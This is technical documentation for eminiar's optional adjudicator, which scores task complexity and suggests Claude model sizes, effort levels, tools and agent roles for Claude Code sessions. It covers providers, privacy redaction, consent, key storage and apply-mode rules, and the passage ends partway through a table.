# Adjudicator

[← Docs index](README.md)

The adjudicator is optional and **off by default**. It scores how complex each piece of work is,
on a 0 to 4 scale, and suggests three things for it:

- the eminiar **tool** to start with (`em_symbols`, `em_search`, `em_execute`, …)
- the Claude **model size** (`haiku`, `sonnet`, `opus`, or `fable` if you add it) and an
  effort level
- the swarm **agent role** (`explorer`, `coder`, `architect`, …)

A piece of work is a prompt you type, a subagent dispatch, or a task in an
[agent swarm](swarms.md) plan. The goal is to send small work to small models and to the right
`em_*` tool, so sessions finish sooner and use fewer tokens. Every suggestion comes with its
reasons.

**Contents:** [What it does not do](#what-it-does-not-do) · [Cost when off](#cost-when-off) ·
[Turn it on](#turn-it-on) · [Providers and privacy](#providers-and-privacy) ·
[Keys](#keys) · [Where the advice shows up](#where-the-advice-shows-up) ·
[Advise and apply](#advise-and-apply) · [Swarm plans](#swarm-plans) ·
[em_adjudicate](#em_adjudicate) · [Dashboard](#dashboard) ·
[Security advice](#security-advice) · [Learning](#learning) · [Savings](#savings) ·
[Accuracy](#accuracy) · [Limits](#budgets-breaker-and-limits) ·
[Troubleshooting](#troubleshooting) · [Turn it off](#turn-it-off)

## How it decides

A built-in **heuristic** always runs. It extracts features from the text (verbs such as
`rename` or `refactor`, paths, scope words, risk words, pasted logs, task titles) and scores
each option from them. It runs in under a millisecond and needs no network. It is also the
fallback whenever anything else fails.

You can blend one **provider** onto the heuristic: TypeSafe's Jev, any OpenAI-compatible
endpoint (Groq, Cerebras, Ollama, LM Studio, llama.cpp or your own), or a local
nearest-neighbour search over labelled examples with the embedding model eminiar already ships.
A provider's weight is capped (`weights.providerMax`, `weights.embeddingMax`), so it adjusts the
heuristic but never replaces it.

The heuristic leans up on purpose. A task given a model that is too small usually fails and is
redone, which costs more than a model one size too large. When the final tier is a near tie
(confidence below `weights.lowConfidence`), it moves one tier up.

Swarm tasks and subagent dispatches are scored **per statement**. The brief is split into its
first line (the task title, or the dispatch description) and its sentences or lines, up to 40 of
them. Routine checks ("run the tests", "keep lint green") and hand-in protocol ("report back",
"post it to the blackboard") are left out, and a repeated statement counts once. Commands such as
`npx vitest run` are routine too, and so is what follows a check label ("Verification: ...",
"Done when ...") when every item in it is a routine check: "Done when the new retry tests pass"
stays work. Only a closed set of routine follow-ups ("fix any failures") is
dropped, so a specific object at the end of a clause ("fix the retry path") is kept as work. The
hardest statement sets the complexity, the tier and the effort; the role and the tool are votes
over all of them. A brief's features and top intents are computed from the statements that are
kept, not the boilerplate, so appended boilerplate changes neither the verdict nor the intent the
learned bias reads. Rows written before this keep the features of their whole text. A brief that,
scored as one text of its kept work, would land past the top of the scale is **saturated**: it
names more work than its hardest statement shows, so its suggested effort is only informational. Prompts and
`em_adjudicate` text are scored as one text.

## What it does not do

- It does not touch API traffic. It uses only Claude Code's own Agent `model` parameter and hook
  text.
- It cannot change the main session's model. Hooks cannot do that, so for the main session it
  only suggests `/model`.
- It never denies or blocks a tool call.
  The [security advice](#security-advice) is the same: it warns, it never blocks.
- It never writes free text into your prompts. Its output is one short line.
- It does nothing in Cursor.

## Cost when off

When `adjudicator.enabled` is `false` (the default), the adjudicator costs one boolean check per
hook. Its code sits in separate chunks of the hook bundle that are loaded only when it is on, and
the config loader skips its section while it is untouched. Measured over 60 interleaved runs
(p50, with Node's compile cache), the prompt and Bash hooks are within 1 ms of the build before
the adjudicator existed: 43.2 → 44.2 ms and 43.2 → 43.5 ms for a prompt, 41.7 → 41.7 ms and
41.4 → 41.6 ms for a Bash call.

While it is off, nothing is written to the database or sent anywhere, and the `em_adjudicate`
tool is not registered.

The [security advice](#security-advice) is a separate opt-in with the same promise, with three
exceptions that do not touch your data. The hook path loads only a leaf with no imports
(`src/adjudicator/security/load.ts`) when security is off, so none of the security code is read.
The MCP server is one bundle, so it still contains the security code, and the `em_swarm` and
`em_adjudicate` tool schema and description still mention security. And `eminiar doctor` still
loads the security code (through `adjudicator/cli.ts`) to build its lines, though it prints none
while security is off, unset and unevaluated.

## Turn it on

You can turn it on in any of these ways:

- **During install.** An interactive `eminiar install` asks *"Use the adjudicator for tool,
  model and agent selection?"* (default No). The question is skipped under `--yes`, by
  `eminiar upgrade`, and once `~/.eminiar/config.json` already says on or off.
  `eminiar install --adjudicator[=heuristic|embedding|typesafe|groq|cerebras|ollama|lmstudio|llamacpp]`
  turns it on without asking.
- **During onboarding.** `/eminiar:em-onboard` asks the same question. It never takes a key in chat. It
  tells you to run `eminiar adjudicator key set` in your own terminal.
- **From the CLI**, at any time:

```sh
eminiar adjudicator enable                      # heuristic only, nothing leaves the machine
eminiar adjudicator enable --provider embedding # local model, still offline
eminiar adjudicator enable --provider ollama    # a local OpenAI-compatible server
eminiar adjudicator enable --provider jev       # TypeSafe Jev: asks for consent and a key
eminiar adjudicator enable --project            # write only adjudicator.enabled to eminiar.config.json
eminiar adjudicator status                      # what is on and what actually runs
```

Hooks pick up the change on the next prompt. The `em_adjudicate` tool is registered when the MCP
server starts, so run **`/mcp reconnect`** (or restart Claude Code) after enabling or disabling.

`enable --project` writes only `adjudicator.enabled: true` to the committed
`eminiar.config.json`. The provider, the keys and the consent stay personal, in
`~/.eminiar/config.json` and `~/.eminiar/adjudicator.key`.

A project file comes with every clone of the repo, so eminiar trusts it only for settings that
cannot send your text or keys anywhere, turn on apply mode, or change the apply settings or the
tier ladder. In `eminiar.config.json` the adjudicator section may set `enabled`, `surfaces`,
`promptMode`, `minPromptChars`, `weights`, `advice`, `embedding`, `learning` and `cache`, and
`mode` only as `"advise"` (a project can keep the adjudicator advise-only, never switch it to
apply). Everything else is ignored there:
`provider`, `typesafe`, `openai` (preset, base URL, model, price), `keyEnv`, `remoteConsent`,
`remoteConsentOrigins`, `privacy`, `budget`, `timeouts`, `breaker`, `mode: "apply"`, `apply` and
`tiers` are read only from `~/.eminiar/config.json` and the `EMINIAR_ADJUDICATOR*` variables.
`eminiar doctor` (check "adjudicator project config"), `adjudicator status` (a `warning:` line,
`projectIgnored` in `--json`) and the dashboard overview name any key a project file sets that
was ignored, even while the adjudicator is off. A repo that turns the adjudicator on for someone
with no personal setup gets the heuristic, which never leaves the machine. Keys named
`__proto__`, `constructor` or `prototype` are dropped from every config file at any depth, so
they cannot smuggle settings past this list.

The security advice has its own, stricter cut: a project file may set only
`adjudicator.security.enabled: true` (see [Security advice](#security-advice)).

The same `.claude/settings.json` `env` block could also move `EMINIAR_HOME` (or `HOME`) into the
repo, so that a `config.json` the repo ships is read as your personal one. eminiar anchors the
personal config to your account: `~/.eminiar/config.json` in the home directory from the
system's user database (not `$HOME`) is always yours. A relative `EMINIAR_HOME` or `HOME` is
never trusted, since the folder a session starts in decides where it points. A `config.json`
anywhere else is honoured only when its real path, after symlinks, is neither inside nor above
the project root, the current directory and every git work tree around them: linked work trees,
and the superproject when you work inside a git submodule. A personal config there gets the same
treatment as `eminiar.config.json`: only the keys listed above apply, and doctor, status and the
dashboard name the ones it ignored. `enable`, `provider` and `key set` refuse to write there (a
key stored inside a repo could be committed). Keep a custom `EMINIAR_HOME` an absolute path
outside your projects; temporary directories, as tests and CI use, are fine. A tree with no git
at all (an unpacked archive) has no work tree to anchor on: don't let its `.claude/settings.json`
set `EMINIAR_HOME` or `HOME` before you have read it.

## Providers and privacy

| Provider | Choose with | Runs where | What leaves this machine | Needs |
|---|---|---|---|---|
| `heuristic` (default) | `--provider heuristic` | in-process, every surface | **nothing** | — |
| `embedding` | `--provider embedding` | MCP server and CLI only; hooks use the heuristic or a verdict the server cached | **nothing**. Uses the local `bge-small` model eminiar already uses for search | the embedding model (downloaded with eminiar's install, or on first use) |
| TypeSafe Jev | `--provider jev` (or `typesafe`) | `api.typesafe.ai` | redacted text, see below | consent and a key |
| Groq | `--provider groq` | `api.groq.com`, model `openai/gpt-oss-20b` | redacted text, see below | consent and a key |
| Cerebras | `--provider cerebras` | `api.cerebras.ai`, model `gpt-oss-120b` | redacted text, see below | consent and a key |
| Ollama | `--provider ollama` | `localhost:11434`, model `qwen2.5:1.5b-instruct` | **nothing** (loopback) | a running Ollama |
| LM Studio | `--provider lmstudio` | `localhost:1234`, the loaded model | **nothing** (loopback) | a running LM Studio server |
| llama.cpp | `--provider llamacpp` | `localhost:8080`, the loaded model | **nothing** (loopback) | a running `llama-server` |
| custom | `provider openai-compatible --preset custom --base-url U --model M` | your URL | nothing if the URL is loopback; otherwise redacted text | `openai.baseUrl` and `openai.model`; consent and a key if remote |

Locality is decided by the URL actually used. A local preset whose `openai.baseUrl` points at
another host counts as remote, and then it needs consent and a key like any hosted provider.
Only `localhost`, `*.localhost`, `127.0.0.0/8` and `::1` count as local.

**What a remote provider receives**, per item:

- The text of the prompt or task after normalising and **redaction**, cut to `privacy.maxChars`
  (default 2000) characters. Redaction masks private keys, credentials in URLs, bearer tokens,
  `sk-…`, GitHub, Slack and AWS keys, JWTs, `key=value` pairs whose name looks secret, email
  addresses, and long hex or base64 runs.
- For a swarm task: the planned role name and the number of files and dependencies.
- The static catalogue: the tier ladder, the tool ids and the role names with their one-line
  descriptions (your swarm's roles and descriptions when scoring a plan).
- A positional item id (`i0`, `i1`, …), never a request key, a path to the project or a
  session id.

The API key goes only in the `Authorization` header. It is scrubbed from every error and log
line.

**Consent.** Before a remote provider is used, eminiar prints exactly what will be sent:

```text
The text of your prompts and subagent tasks (redacted, at most 2000 chars) is sent to https://api.typesafe.ai to score them.
```

Then it asks y/N. Without a terminal, `--accept-remote` is the only way to agree. `--yes` never
grants it. If you decline during install, the heuristic is used instead. If you decline in
`enable` or `provider`, nothing changes.

Consent is bound to the **origin** the notice named: scheme, host and port. Agreeing writes
`remoteConsent: true` and adds that origin to `remoteConsentOrigins` in `~/.eminiar/config.json`
(for example `["https://api.groq.com"]`). Every remote call checks it: a provider whose URL has
another origin falls back to the heuristic with `no_consent`. Switching to another preset, or
`provider … --base-url` with a new host or port, shows the notice and asks again. A project file
cannot set `remoteConsentOrigins`.

No environment variable can grant consent: a project's `.claude/settings.json` can set
environment variables for your session and its hooks, so a cloned repo must not be able to start
sending your prompts anywhere. `EMINIAR_ADJUDICATOR=1` may turn the adjudicator on, and
`EMINIAR_ADJUDICATOR_PROVIDER` may pick a remote provider, but that provider runs only when
`remoteConsentOrigins` in `~/.eminiar/config.json` already lists its origin; otherwise the
heuristic runs with `no_consent`. `EMINIAR_ADJUDICATOR_REMOTE=1` does nothing.
`EMINIAR_ADJUDICATOR_REMOTE=0` withdraws every consent, and `EMINIAR_ADJUDICATOR=0` turns the
adjudicator off.

A config written before consent named origins (`remoteConsent: true` with no list) still covers
the built-in hosts (`https://api.groq.com`, `https://api.cerebras.ai`, `https://api.typesafe.ai`)
for the provider your config names, but not for one `EMINIAR_ADJUDICATOR_PROVIDER` swaps in. The
next `enable` or `provider` writes `remoteConsentOrigins` with only the origin its notice named.
The provider your config named is worked out from `~/.eminiar/config.json` alone, never from an
environment override. If you move to another host, the old one asks again the next time you pick
it.

eminiar never follows an HTTP redirect from a provider: a 3xx answer is an error, so a server
cannot forward your text or key to another host. Set the base URL to the final endpoint.

**What is stored locally**, in this project's database under `~/.eminiar/projects/` (never in
the repository): a hash of the input, the scores and reasons, the provider status, latency and
tokens, and at most 80 redacted characters of the input (`privacy.storeHead: false` stores
none). Keys are never stored. Prompt text beyond those 80 characters is stored only if you turn
on Jev request capture (below). `eminiar purge adjudicator --yes` deletes the decisions, the
verdict cache, the provider state, the learned bias and any captured Jev requests.

### Jev request capture

Off by default. `eminiar adjudicator exchanges on` keeps each request eminiar sends to TypeSafe
Jev and the answer that comes back, with its timing: the wait before sending, the time to the
first byte, the total duration, any retry wait, the attempts, the deadline and whether it was
missed, the HTTP status and the tokens. The Jev section of the dashboard lists them.

A captured request contains your prompt text as it was sent: redacted and cut to
`privacy.maxChars` characters per item, up to 10 items per request. It is kept in this project's
local database, redacted once more, and capped at 65,536 characters per request or answer (a cut
body is marked truncated). With 100 requests kept that is at most 200 bodies, about 13 million
characters per project; text in a script that takes several bytes per character is larger on
disk (a body of Chinese text is about three times as many bytes as characters). The key and the
`Authorization` header are never stored. Only the newest 100 requests are kept; older ones are
deleted as new ones arrive. `redact()` is best effort, so treat captured requests like the
prompts themselves.

How a body is scrubbed before it is stored: your TypeSafe key is replaced wherever it appears,
including when an echo hides it with zero-width characters or fullwidth forms. In a JSON body,
the value of any field named like a secret (`client_secret`, `token`, `password`, `cookie`,
`authorization`) is masked. A response body longer than 131,072 characters is not parsed: its
first 131,072 characters are scrubbed, the first 65,536 of those are stored, and it is marked
truncated.

Only `~/.eminiar/config.json` can turn capture on (`privacy.captureExchanges`). An
`eminiar.config.json` in a repository, or an environment variable, cannot.
`EMINIAR_ADJUDICATOR_CAPTURE=0` turns it off. `eminiar adjudicator exchanges off` turns it off
and deletes this project's captured requests. `eminiar adjudicator exchanges purge --yes`
deletes them and leaves capture on. Requests from `adjudicator test`, `adjudicator eval` and the
dashboard's try-it box are never captured.

Turning capture off takes effect at once, also for a background scoring job that is already
running: it re-reads the setting before it writes, so it stores nothing after `exchanges off`,
the environment switch or a purge.

`exchanges off`, `exchanges purge` and `eminiar purge adjudicator|all` erase the stored text from
the database file and its write-ahead log, not only from the table: freed pages are zeroed
(secure delete) and the log is checkpointed and cut. That last step is best effort: when another
process (the MCP server, the dashboard) holds the database busy, the log is left as it is until
it next checkpoints. Pruning the oldest requests as new ones arrive zeroes their pages too.

### Setting up each provider

- **Heuristic:** `eminiar adjudicator enable`. Nothing else.
- **Embedding:** `eminiar adjudicator enable --provider embedding`. The first scoring embeds the
  shipped examples once and caches the vectors under `~/.eminiar/models/`. The MCP server warms
  the model in the background at start. `eminiar install --no-model` defers the model download to
  first use.
- **Jev:** `eminiar adjudicator enable --provider jev`, agree to the notice, then paste your
  TypeSafe key at the hidden prompt (or later: `eminiar adjudicator key set typesafe`). The model
  is pinned to `jev-1.14.0`. The moving aliases `jev-latest` and `jev-preview` are replaced by
  it, because the thresholds were tuned against that version. Jev charges $0.042 per million
  input tokens; output is free.
- **Groq / Cerebras:** `eminiar adjudicator enable --provider groq` (or `cerebras`), agree, paste
  the key. Groq is priced at $0.075 / $0.30 per million input / output tokens. Cerebras has no
  price in the table, so its cost shows as unknown unless you set `openai.price`, and
  `budget.dailyCalls` is what limits it.
- **Ollama:** `ollama pull qwen2.5:1.5b-instruct`, then
  `eminiar adjudicator enable --provider ollama`. On session start eminiar sends a keep-alive
  request so the model is loaded before your first prompt.
- **LM Studio / llama.cpp:** start the server with a small instruct model loaded, then
  `eminiar adjudicator enable --provider lmstudio` (or `llamacpp`). The server's loaded model is
  used unless you set `openai.model`.
- **Custom:** `eminiar adjudicator provider openai-compatible --preset custom --base-url https://host/v1 --model my-model`.
  JSON answers use a strict JSON schema; with `openai.json: "auto"` a server that rejects
  `response_format` gets plain JSON mode instead, and the choice is remembered.

`eminiar adjudicator provider --detect` looks for Ollama, LM Studio and llama.cpp on their
default ports and suggests a command. It changes nothing.

## Keys

Keys never go in config files, on the command line, in logs, in the database or in any
dashboard payload. A config section that contains a field named like `apiKey`, `token`,
`secret` or `password` is rejected.

`eminiar adjudicator key set [provider]` reads the key from a hidden prompt, or from stdin when
there is no terminal (`pbpaste | eminiar adjudicator key set typesafe`). It stores the key in
**`~/.eminiar/adjudicator.key`**, a JSON file with mode **0600** written through a temporary file
and a rename. A key file that group or others can read is ignored, and `doctor` tells you to run
`chmod 600`. A key given as an argument is refused, and so is any flag value shaped like one:
`--model`, `--since`, `--fixture` or `--repeat` with a key prefix or a long run of characters
with digits, and a `--base-url` with a user name or password, a fragment, or a query parameter or
path segment that holds a key. The error never repeats the value and nothing is written.

eminiar looks for a key in this order:

1. the environment variable named by `adjudicator.keyEnv`
   (`eminiar adjudicator key set --from-env NAME` stores only the name)
2. the provider's own variable: `TYPESAFE_API_KEY`, `GROQ_API_KEY` or `CEREBRAS_API_KEY`
3. `EMINIAR_ADJUDICATOR_KEY`
4. the key file

`keyEnv` counts only in `~/.eminiar/config.json`. A local provider (one whose URL is
`localhost`, `127.x.x.x` or `::1`) never gets a key from an environment variable, not even
`keyEnv` or `EMINIAR_ADJUDICATOR_KEY`: if your local server needs a token, store it with
`eminiar adjudicator key set` for that preset.

`eminiar adjudicator key status` shows where each key comes from, masked as `****abcd`. It
reports the key that would actually be sent, so a local target shows only its key-file entry
(or none), never an environment variable.
`key clear [provider]` removes one key, or the whole file.

## Where the advice shows up

| Surface | Hook | What you see | Config |
|---|---|---|---|
| Prompt | UserPromptSubmit | One line for Claude, for example `eminiar adjudicator: complexity 1/4 (lookup) · start with em_symbols → em_search · if you delegate: haiku, role explorer` | `surfaces.prompt` |
| Main session | UserPromptSubmit | A note when the session model is at least two tiers above the advice, at most once every `advice.cooldownPrompts` prompts: `… /model haiku would be cheaper than opus` | `advice.mainSession`: `user` (shown to you), `context` (to Claude) or `off` |
| Subagent dispatch | PreToolUse on `Agent` | A note on the call: `adjudicator: model haiku would do (complexity 1, conf 0.82): pass model:'haiku'; pass effort:'low' (Claude Code 2.1.292+), role explorer`. For an agent whose definition pins a model it names the pin instead: `adjudicator: pinned opus (adjudicator would pick haiku; remove the model pin in .claude/agents/x.md to let it choose); …`. See [What the advice tells you to pass](#what-the-advice-tells-you-to-pass) for ranged swarm roles, FORCE and forks. In apply mode it sets the effort and may set the model | `surfaces.agent` |
| Swarm plan | `em_swarm plan` | One line per task, see [Swarm plans](#swarm-plans) | `surfaces.plan` |
| Raw tool | PreToolUse on `Bash`, `Read`, `Grep`, … | A hint when the call contradicts the prompt's advised `em_*` tool, once per prompt, only when routing said nothing | `surfaces.tools` (off by default) |

Prompts shorter than `minPromptChars`, slash commands and plain chat are not scored. Neither are
the turns Claude Code adds by itself, which reach the prompt hook like typed prompts: a text that
starts with `<agent-message` (a subagent's hand-back), `<task-notification` (a background task
finished), `<ci-monitor-event` (a CI monitor's event) or `<system-reminder` (harness context)
gets no decision and no advice line, and does not count towards the main-session note's
cooldown. Claude Code can also put closed `<system-reminder>…</system-reminder>` blocks ahead of
what you typed (a worktree note, for example): those blocks are stripped and the text after them
is scored as your prompt, with the length, slash-command and chat checks applied to it. A turn
that is only reminders, or whose reminders are followed by another of these tags, is skipped. A
prompt that mentions one of these tags further on is scored as usual. On a prompt the provider runs according to `promptMode`:

- `async` (default): the heuristic answers at once. A detached process asks the provider and
  caches the blended verdict, so a repeat of the same text gets it.
- `blocking`: the provider is asked inline, within `timeouts.promptMs` (local providers:
  `timeouts.localMs`).
- `heuristic`: the provider is never asked on prompts.

## Advise and apply

`mode: "advise"` (default) only suggests. The coordinator, or you, passes `model` and `effort`
on the Agent call. A dispatch in advise mode never makes a network call; it uses the plan's
verdict, a cached one, or the heuristic.

`mode: "apply"` lets the PreToolUse hook set `model` and `effort` on the Agent call itself,
through Claude Code's `updatedInput`, which replaces the call's arguments. Both go into the same
single `updatedInput`. Claude Code runs the subagent on that model: a test on Claude Code 2.1.309
(`claude -p`) showed that a model the hook sets wins over the agent file's `model` pin and over a
`model` passed on the call. eminiar itself never overrides either (see the conditions below). It
still checks the result: `eminiar adjudicator status` and the dashboard show how many applied
dispatches ran on the chosen model ("n of m"), and [Troubleshooting](#troubleshooting) lists what
makes the two differ. For the effort, see [Apply mode and effort](#apply-mode-and-effort).

These are Claude Code's rules for a subagent's model, and the adjudicator follows them:

1. `model` on the Agent call wins, then the subagent's frontmatter `model` (`inherit` means the
   main model), then `CLAUDE_CODE_SUBAGENT_MODEL`, then the main session's model. A model that a
   PreToolUse hook sets through `updatedInput` counts as the call's `model`; a plugin mod's
   `agent.spawn` hook outranks it.
2. `CLAUDE_CODE_SUBAGENT_MODEL_FORCE` overrides all of them. It follows Claude Code's on/off
   rule: `1`, `true`, `yes` or `on`, in any casing, turn it on; anything else (`0`, `false`,
   `no`, `off`, empty, unknown values) leaves it off. While it is on, the adjudicator never
   changes a model, the advice says the model is informational (no pin is named: FORCE ignores
   pins too), and `status` and `doctor` warn in apply mode.
3. The Agent `model` parameter accepts only `haiku`, `sonnet`, `opus` and `fable`.
4. **Effort can be passed per call** from Claude Code 2.1.292: the Agent call takes an `effort`
   parameter (`low`, `medium`, `high`, `xhigh` or `max`; levels a model lacks fall back to the
   highest one below) that overrides the agent file's `effort`, for non-fork subagents.
   `CLAUDE_CODE_EFFORT_LEVEL` outranks both. An `effort` that a PreToolUse hook sets through
   `updatedInput` counts as the call's `effort`. The adjudicator suggests a level (`max` only
   at the very top of the complexity scale, c ≥ 3.75). In advise mode the coordinator passes it,
   and the level is informational while `CLAUDE_CODE_EFFORT_LEVEL` is set, when the call already
   passes `effort`, and for a [saturated](#how-it-decides) brief. In apply mode the hook sets it
   (see [Apply mode and effort](#apply-mode-and-effort)). Either way, reconcile checks afterwards
   which level ran (see [Effort follow-through](#effort-follow-through)).

Apply mode changes the model only when all of these hold:

- `apply.scope` is `all`, or the dispatch is a swarm worker (`swarm`, the default)
- the call has no explicit `model`, and it is not a fork
- the agent's definition has no `model` pin (or `inherit`), the agent is a swarm role with a
  [model range](swarms.md#model-ranges) whose pick moves its model, or
  `apply.respectFrontmatter` is `false`
- `CLAUDE_CODE_SUBAGENT_MODEL_FORCE` is off
- the tier confidence is at least `apply.minConfidence`

The tier is clamped to `apply.floor` … `apply.ceiling`, and for a ranged role to its range as
well. When that pick is the tier of the role's fallback `model`, or no tier lies inside both
bounds, the hook sets nothing and the worker runs on its fallback, so a pinned model id or `[1m]`
variant is never swapped for the bare alias. The hook keeps every other field of the call and
never turns a deny or ask into an allow. Each dispatch is recorded as `advised`, `applied` or
`respected` (left alone because of an explicit model, a pin, a ranged role's fallback, a fork or
FORCE). These conditions are for the model only; the effort has its own, below.

### Apply mode and effort

In apply mode the hook always sets the advised effort on the Agent call, on every dispatch
`apply.scope` covers. It does so even when the model is left alone (a pin, a ranged role's
fallback, an explicit `model`, FORCE, or a tier confidence below `apply.minConfidence`), and even
when the call or the agent file already sets an effort. The note then says `effort low applied`,
for example `adjudicator: model haiku applied (complexity 1, conf 0.82); effort low applied, role
explorer`, or, for a pinned agent, `adjudicator: pinned opus (…); effort low applied`.

A probe on Claude Code 2.1.311 (`claude -p`, 22 runs; ground truth is the effort in the
subagent's API requests) showed:

| Case | What ran |
|---|---|
| The hook sets `low`, nothing else sets an effort | `low` (3 of 3) |
| The call passes `high`, the hook sets `low` | `low`: the hook wins (2 of 2) |
| The agent file sets `high`, the hook sets `low` | `low`: the hook wins (2 of 2) |
| `CLAUDE_CODE_EFFORT_LEVEL=high`, the hook sets `low` | `high`: the environment variable wins, and the hook's value is dropped silently (2 of 2) |
| A fork, the hook sets `low` | the parent's effort: a fork drops the value silently (3 of 3) |
| The hook sets a value that is not a level | the whole Agent call fails schema validation and no subagent runs (2 of 2) |
| A model without effort support (`claude-haiku-4-5`) | the call is accepted, and no effort is sent with its requests (2 of 2) |
| `haiku` and `sonnet` 5.5 models, `xhigh` or `max` | the level that was set (6 of 6) |

So the hook sets no effort when:

- the dispatch is a fork (the note says ``no `model` to pass, effort not applied (a fork takes
  none; …)``)
- `CLAUDE_CODE_EFFORT_LEVEL` is set (the note says `effort low not applied:
  CLAUDE_CODE_EFFORT_LEVEL is set and outranks it`)
- routing denied or asked about the call (the call is never rewritten)
- the dispatch is outside `apply.scope`: it is advised as in advise mode

The hook only ever sends one of `low`, `medium`, `high`, `xhigh` or `max`, since any other
value fails the call. It does not lower the level for a model: the 5.5 models take every level,
and a model without effort support ignores it. For such a model the level that ran is unknown, so
the dispatch is not counted in the effort follow rate.

A [saturated](#how-it-decides) brief still gets its effort set in apply mode, but the dispatch is
not counted in the follow rate, because its effort is informational advice.

The provider is asked inline for an apply-mode dispatch only on a cache miss, within
`timeouts.agentMs`, and only when the verdict will be applied. That is a dispatch whose model may
still move (no explicit `model`, no pin, not a fork, not FORCE; a ranged role whose pick can move
counts too), and any other in-scope dispatch whose effort is set: a pinned agent, an explicit
`model`, or FORCE, which get their effort alone. It is not asked in advise mode, for a fork, under
`CLAUDE_CODE_EFFORT_LEVEL` (unless the model may move), when the dispatch is denied or asked (unless
the model may move, and then the call is still not rewritten), or when a plan row already holds the
verdict.

There is no Claude Code version check: the hook input carries no version. The Agent call takes
`effort` from 2.1.292. On 2.1.311 an unknown key in `updatedInput` is dropped rather than
rejected, so an older Claude Code probably drops `effort` too, and the call runs as without
eminiar. Versions older than 2.1.292 were not tested.

The pin is looked up the way Claude Code finds the agent: managed agents first, then the
project's `.claude/agents` folders from the current directory up to the repo root (closest
first), then `~/.claude/agents`, then plugin agents (`plugin:agent`, from
`installed_plugins.json` and `CLAUDE_CODE_PLUGIN_DIRS`), then the built-in agents. Folders are
searched recursively and matched on the frontmatter `name`, not the file name. When the pin
cannot be known (no definition found, an unreadable or malformed file, copies that disagree, or
an agent defined only for the session with `--agents`), apply mode leaves the model alone and
only advises: the note says "model pin is unknown (… not overridden while the agent's definition
cannot be read)" and the decision's `scores.pin` records why.

Advise mode respects pins the same way (with `apply.respectFrontmatter` on, the default). For a
pinned agent, or one whose pin is unknown, the dispatch note and the plan line name the pin and
what the adjudicator would pick, and never tell the coordinator to pass a different `model`.
These dispatches get no savings credit, even if a `model` is passed anyway.

To let the adjudicator choose a swarm worker's model, give its role a
[`model_range`](swarms.md#model-ranges) in `swarm.yaml`. The role's `model` stays as the
fallback, so the worker runs as before whenever the adjudicator is off, fails or picks the
fallback's tier. Removing the pin (or `model: inherit`) works too, but then a worker the
adjudicator does not change runs on `CLAUDE_CODE_SUBAGENT_MODEL` or the main session's model.
When every role of a swarm pins a model without a range, the adjudicator cannot change any
worker: the plan says so, and in apply mode `eminiar adjudicator status` (a `warning:` line,
`pinnedSwarms` in `--json`) and `eminiar doctor` (check "adjudicator swarm pins") do too.

### What the advice tells you to pass

One rule decides what the dispatch note, the plan's suggestion lines and the plan's "Next:" line
tell the coordinator to pass on the Agent call. The first matching row decides `model`:

| The dispatch | `model` | `effort` | Savings credit |
|---|---|---|---|
| A fork (`subagent_type: "fork"`) | none: a fork runs on the main session's model | none: per-call `effort` is for non-fork subagents | none |
| `CLAUDE_CODE_SUBAGENT_MODEL_FORCE` on | informational: Claude Code ignores the call's `model` and the agent's pin | by the effort rule | none |
| A swarm role with a [model range](swarms.md#model-ranges), when its pick moves its model | pass the pick: the suggested tier clamped to the role's range and to `apply.floor` … `apply.ceiling` | by the effort rule | when followed or applied, measured against the fallback |
| The agent's pin is respected (pinned, or unknown), or a ranged role keeps its fallback (the pick is the fallback's tier, or no tier lies inside both bounds) | none: the agent keeps its pin or fallback | by the effort rule | none |
| Anything else | pass the suggested `model`: the suggested tier clamped to `apply.floor` … `apply.ceiling` | by the effort rule | when followed or applied |

The effort rule: in apply mode, within `apply.scope`, pass no `effort`: the hook sets it
(`applied`), unless `CLAUDE_CODE_EFFORT_LEVEL` is set, which makes it informational. Otherwise
pass the suggested `effort` (Claude Code 2.1.292+), unless `CLAUDE_CODE_EFFORT_LEVEL` is set, the
call already passes `effort`, or the brief is [saturated](#how-it-decides); then the level is
informational. The "Next:" line only mentions
`model` when at least one task has a model to pass, and then adds "leave `model` unset for
pinned agents" when some agents keep a pin (a ranged role's fallback included). With
`apply.respectFrontmatter` off, a range is ignored like any pin.

In advise mode, when the agent file sets its own `effort`, the dispatch note says how it compares
with the advice (a fork has no file, so its note never mentions one). In apply mode the note says
`effort low applied` whatever the file sets, since the hook's level wins:

| Case | Effort part of the note |
|---|---|
| The file already sets the advised level | `effort low: the agent file already sets it` |
| The file sets another level | `pass effort:'low' (Claude Code 2.1.292+) over the agent file's high` |
| A saturated brief, no `effort` on the call | `effort max: informational (brief saturated); the agent file runs high` |
| The call passes `effort`, or `CLAUDE_CODE_EFFORT_LEVEL` is set | `suggested effort low` |

The level is read from the frontmatter only when every copy of the definition agrees on it. The
hook only reads the file and never changes it. In advise mode it never changes the call's
`effort` either.

A ranged role's note names the range and the fallback. When the pick moves the model:

```text
adjudicator: model haiku would do (range haiku–opus, fallback sonnet; complexity 1, conf 0.82): pass model:'haiku'; pass effort:'low' (Claude Code 2.1.292+)
```

When it does not, there is no `model` to pass:

```text
adjudicator: fallback sonnet (range haiku–opus; matches the adjudicator's pick); pass effort:'medium' (Claude Code 2.1.292+)
```

In apply mode the first one reads `adjudicator: model haiku applied (range haiku–opus, fallback
sonnet; …); effort low applied`, and the second ends in `effort medium applied`. In advise mode a
saturated brief's effort reads `effort max: informational (brief saturated)`. A note names a role
(`role explorer`) only when the role table's confidence is at least 0.7.

A fork's note is only informational:

```text
adjudicator: fork runs on the main session's model; no `model` or `effort` to pass (complexity 3, conf 0.80)
```

In apply mode it reads ``no `model` to pass, effort not applied (a fork takes none; …)``.

Under FORCE the note keeps the effort hint and calls the model informational:

```text
adjudicator: CLAUDE_CODE_SUBAGENT_MODEL_FORCE sets the model (adjudicator would pick haiku; complexity 1, conf 0.82); pass effort:'low' (Claude Code 2.1.292+), role explorer
```

Dispatches without a model to pass are kept out of the comparison between advice and outcome:
reconcile never marks them followed or ignored, the follow rate leaves them out of its
denominator, and the suggested tier × model matrix counts them on their own line ("2 kept their
pin", "1 under CLAUDE_CODE_SUBAGENT_MODEL_FORCE", "1 fork"). A pinned dispatch counts as having
kept its pin when no `model` was passed and it ran on the pinned tier; otherwise it stays in the
matrix.

### Effort follow-through

Reconcile checks afterwards whether the subagent ran at the advised level, whether the
coordinator passed it (advise mode) or the hook set it (apply mode). The dispatch row records
what it knew at the call, and reconcile adds what ran, all in the decision's `scores` JSON (no
new columns):

| Key | Written by | Value |
|---|---|---|
| `passedEffort` | the dispatch hook | the `effort` the Agent call passed |
| `effortApplied` | the dispatch hook | the `effort` the hook set on the call in apply mode; it overrides `passedEffort` and `agentEffort` |
